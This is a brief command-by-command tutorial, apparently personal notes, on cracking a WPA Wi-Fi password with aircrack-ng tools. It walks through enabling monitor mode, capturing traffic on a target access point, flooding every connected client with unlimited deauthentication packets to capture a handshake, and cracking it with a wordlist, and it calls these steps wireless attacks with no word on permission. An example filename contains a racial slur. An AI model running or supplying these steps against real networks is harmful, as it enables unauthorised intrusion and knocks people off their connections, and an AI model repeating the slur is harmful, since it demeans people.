Before putting a Wi-Fi adapter into **monitor mode** (required for packet sniffing, WEP/WPA cracking, etc.), some background processes (like `NetworkManager`, `wpa_supplicant`, or `dhclient`) may conflict.

- This command identifies and kills those processes to ensure a clean setup for wireless attacks.

```
sudo airmon-ng check kill
```

Now we need enable monitor-mode to the interface wlan0

- puts the wifi adapter into monitor-mode allowing it to capture all wireless traffic in the vicinity
- Essential for wifi hacking, packet sniffing and security testing 

```
sudo airmon-ng start wlan0
```

Next step:
- Detect nearby wifi networks
- monitor connected clients
- capture packets

```
sudo airodump-ng wlan0mon
```

Now monitor a specific wifi network and save the data to a file for further analysis 

```
sudo airodump-ng -w [Filename] -c [Channel] --bssid [MAC address] wlan0mon
```
eg:
```
sudo airodump-ng -w hackernigga -c 4 --bssid BC:62:D2:52:47:10 wlan0mon
```

Now we need to disconnect all the users that connected to wifi network
 - Run the command

```
sudo aireplay-ng --deauth 0 -a [MAC address] wlan0mon
```
wait unti to get the WPA handshake

After getting the handshake stop the monitor-mode

```
sudo airmon-ng stop wlan0mon
```

After that run the following command to crack the Handshake

```
sudo aircrack-ng [filename.cap] -w [path to wordlist]
```